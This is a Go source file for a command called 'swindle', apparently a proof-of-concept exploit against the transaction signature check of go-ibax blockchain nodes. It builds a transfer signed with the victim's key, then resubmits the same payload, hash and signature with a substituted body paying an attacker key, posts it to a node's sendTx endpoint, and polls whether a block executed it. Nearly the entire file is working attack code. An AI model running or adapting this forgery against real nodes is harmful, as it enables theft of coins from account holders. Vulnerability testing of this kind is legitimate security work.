// Command swindle probes the second half of the transaction signature check: a stored transaction
// carries the payload, the hash of that payload and the body the node runs as three fields of their
// own, and a signature covers only the hash. It takes the payload, the hash and the signature of a
// transfer the victim signed and never sent, and submits the same three carrying a body of its own
// that pays the attacker. Everything else is left exactly as the victim signed it, so the only thing
// a node can tell the two apart by is the relation between the body and the payload.
//
//	swindle -node URL -key FILE -from KEYID -to KEYID -value V
//
// -key is the victim's private key, used only to produce the signature the attacker replays: the
// body that signature was given for pays the victim itself, the body that is sent pays -to. A node
// that runs it moves the victim's coins for a transfer it never made.
//
// It exits 0 when the node ran the forged transaction, 1 when it refused it, and 3 when no block
// took it in the time allowed.
package main

import (
	"bytes"
	"encoding/hex"
	"encoding/json"
	"flag"
	"fmt"
	"mime/multipart"
	"net/http"
	"net/url"
	"os"
	"strings"
	"time"

	"github.com/IBAX-io/go-ibax/packages/common/crypto"
	"github.com/IBAX-io/go-ibax/packages/conf"
	"github.com/IBAX-io/go-ibax/packages/converter"
	"github.com/IBAX-io/go-ibax/packages/smart"
	"github.com/IBAX-io/go-ibax/packages/transaction"
	"github.com/IBAX-io/go-ibax/packages/types"
	"github.com/vmihailenco/msgpack/v5"
)

// How long a forged transaction is given to reach a block, and how often its status is asked for
const (
	deadline = 2 * time.Minute
	poll     = 500 * time.Millisecond
)

// What the command exits with
const (
	executed = 0
	refused  = 1
	noBlock  = 3
)

func main() {
	node := flag.String("node", "http://127.0.0.1:7079", "API host of a node of the network")
	keyFile := flag.String("key", "", "file of the victim's private key (hex)")
	from := flag.Int64("from", 0, "key id the header names, the victim")
	to := flag.Int64("to", 0, "key id the replayed transfer pays, the attacker")
	value := flag.String("value", "", "amount to transfer, in the smallest unit")
	networkID := flag.Int64("networkid", 7, "network id of the chain")
	flag.Parse()
	if *keyFile == "" || *from == 0 || *to == 0 || *value == "" {
		fmt.Fprintln(os.Stderr, "usage: swindle -node URL -key FILE -from KEYID -to KEYID -value V")
		os.Exit(2)
	}

	keyHex, err := os.ReadFile(*keyFile)
	if err != nil {
		fail("reading the victim's key", err)
	}
	key, err := hex.DecodeString(strings.TrimSpace(string(keyHex)))
	if err != nil {
		fail("decoding the victim's key", err)
	}

	conf.Config.LocalConf.NetworkID = *networkID
	crypto.InitHashAlgo("KECCAK256")
	algo := crypto.AsymAlgo_ECC_Secp256k1
	account, err := crypto.AccountKeyOf(algo, key)
	if err != nil {
		fail("deriving the account key of the victim", err)
	}
	pub := account.Bytes()

	// The transfer the victim signs and never sends: it pays the victim itself.
	signed := &types.SmartTransaction{
		Header: &types.Header{EcosystemID: 1, KeyID: *from, Time: time.Now().Unix(), NetworkID: *networkID, PublicKey: pub},
		UTXO:   &types.UTXO{ToID: *from, Value: "1", Comment: "the transfer the attacker observed"},
	}
	payload, err := msgpack.Marshal(signed)
	if err != nil {
		fail("encoding the payload the victim signs", err)
	}
	hash := crypto.DoubleHash(payload)
	// A transaction is signed over the hash of its hash, as the client frame carries it
	signature, err := crypto.NewAsymAlgo(algo).Sign(key, crypto.Hash(hash))
	if err != nil {
		fail("signing as the victim", err)
	}
	fmt.Printf("the victim signed %x and never sent it\n", hash)

	// The transaction the attacker sends: the same header, payload, hash and signature, and a body
	// that pays the attacker.
	body := *signed
	body.UTXO = &types.UTXO{ToID: *to, Value: *value, Comment: "swindle"}
	data, err := msgpack.Marshal(&transaction.SmartTransactionParser{SmartContract: &smart.SmartContract{
		TxSmart:     &body,
		Hash:        hash,
		Payload:     payload,
		TxSignature: converter.EncodeLengthPlusData(signature),
		Timestamp:   time.Now().UnixMilli(),
	}})
	if err != nil {
		fail("encoding the forged transaction", err)
	}
	forged := append([]byte{types.UtxoTxType}, data...)

	// What the library this command is built with makes of the form, for the record only: the node,
	// not this library, is what the probe asks to run it, and only its answer decides.
	if parsed, err := transaction.UnmarshallTransaction(bytes.NewBuffer(bytes.Clone(forged)), true); err != nil {
		fmt.Printf("note: the go-ibax this command links refuses the form: %v\n", err)
	} else {
		fmt.Printf("note: the go-ibax this command links parses it as type %d\n", parsed.Type())
	}

	// A session token, as both endpoints require: any account's, the attacker's own
	token, err := login(*node, algo, key, account)
	if err != nil {
		fail("opening a session", err)
	}

	// /sendTx takes the hash of the transaction as the name of its part
	form := new(bytes.Buffer)
	writer := multipart.NewWriter(form)
	writer.WriteField(hex.EncodeToString(hash), hex.EncodeToString(forged))
	writer.Close()
	req, err := http.NewRequest(http.MethodPost, strings.TrimRight(*node, "/")+"/api/v2/sendTx", form)
	if err != nil {
		fail("building the sendTx request", err)
	}
	req.Header.Set("Content-Type", writer.FormDataContentType())
	req.Header.Set("Authorization", "Bearer "+token)
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		fail("sending the forged transaction", err)
	}
	answer := new(bytes.Buffer)
	answer.ReadFrom(resp.Body)
	resp.Body.Close()
	fmt.Printf("sendTx: %s %s\n", resp.Status, strings.TrimSpace(answer.String()))
	if resp.StatusCode != http.StatusOK {
		os.Exit(refused)
	}

	// The node took it: what it does with it, a block decides
	hexHash := hex.EncodeToString(hash)
	until := time.Now().Add(deadline)
	for {
		status, err := txstatus(*node, token, hexHash)
		if err != nil {
			fail("asking for the status of the forged transaction", err)
		}
		if s, ok := status[hexHash]; ok {
			if s.Message != nil {
				fmt.Printf("refused in block %s: %s: %s\n", s.BlockID, s.Message.Type, s.Message.Msg)
				os.Exit(refused)
			}
			if s.BlockID != "" && s.BlockID != "0" {
				fmt.Printf("EXECUTED in block %s\n", s.BlockID)
				os.Exit(executed)
			}
		}
		if time.Now().After(until) {
			fmt.Println("no block took the forged transaction in 2 minutes")
			os.Exit(noBlock)
		}
		time.Sleep(poll)
	}
}

func fail(what string, err error) {
	fmt.Fprintln(os.Stderr, "swindle:", what+":", err)
	os.Exit(2)
}

// login opens a session with the key and returns its token
func login(node string, algo crypto.AsymAlgo, key []byte, account crypto.AccountKey) (string, error) {
	var uid struct {
		UID       string `json:"uid"`
		Token     string `json:"token"`
		NetworkID string `json:"network_id"`
	}
	resp, err := http.Get(strings.TrimRight(node, "/") + "/api/v2/getuid")
	if err != nil {
		return "", err
	}
	json.NewDecoder(resp.Body).Decode(&uid)
	resp.Body.Close()

	signature, err := crypto.NewAsymAlgo(algo).Sign(key, crypto.Hash([]byte("LOGIN"+uid.NetworkID+uid.UID)))
	if err != nil {
		return "", err
	}
	form := url.Values{
		"pubkey":    {account.Hex()},
		"signature": {hex.EncodeToString(signature)},
		"ecosystem": {"1"},
	}
	// The first call hands the session token back in the body, and a node that answers with it in
	// the UID answer wants the second call to carry it
	session := struct {
		Token string `json:"token"`
	}{}
	for _, bearer := range []string{"", uid.Token} {
		req, err := http.NewRequest(http.MethodPost, strings.TrimRight(node, "/")+"/api/v2/login", strings.NewReader(form.Encode()))
		if err != nil {
			return "", err
		}
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		if bearer != "" {
			req.Header.Set("Authorization", "Bearer "+bearer)
		}
		resp, err := http.DefaultClient.Do(req)
		if err != nil {
			return "", err
		}
		body := new(bytes.Buffer)
		body.ReadFrom(resp.Body)
		resp.Body.Close()
		if err := json.Unmarshal(body.Bytes(), &session); err == nil && session.Token != "" {
			return session.Token, nil
		}
	}
	return "", fmt.Errorf("no session token in the answers")
}

type txError struct {
	Type string `json:"type"`
	Msg  string `json:"error"`
}

// txstatus asks for the status of a transaction: its block once one has taken it, or the error the
// chain refused it with
func txstatus(node, token, hash string) (map[string]*struct {
	BlockID string   `json:"blockid"`
	Message *txError `json:"errmsg"`
}, error) {
	request, err := json.Marshal(map[string][]string{"hashes": {hash}})
	if err != nil {
		return nil, err
	}
	req, err := http.NewRequest(http.MethodPost, strings.TrimRight(node, "/")+"/api/v2/txstatus",
		strings.NewReader(url.Values{"data": {string(request)}}.Encode()))
	if err != nil {
		return nil, err
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("Authorization", "Bearer "+token)
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return nil, err
	}
	body := new(bytes.Buffer)
	body.ReadFrom(resp.Body)
	resp.Body.Close()
	var answer struct {
		Results map[string]*struct {
			BlockID string   `json:"blockid"`
			Message *txError `json:"errmsg"`
		} `json:"results"`
	}
	if err := json.Unmarshal(body.Bytes(), &answer); err != nil {
		return nil, fmt.Errorf("%s %s: %w", resp.Status, strings.TrimSpace(body.String()), err)
	}
	return answer.Results, nil
}
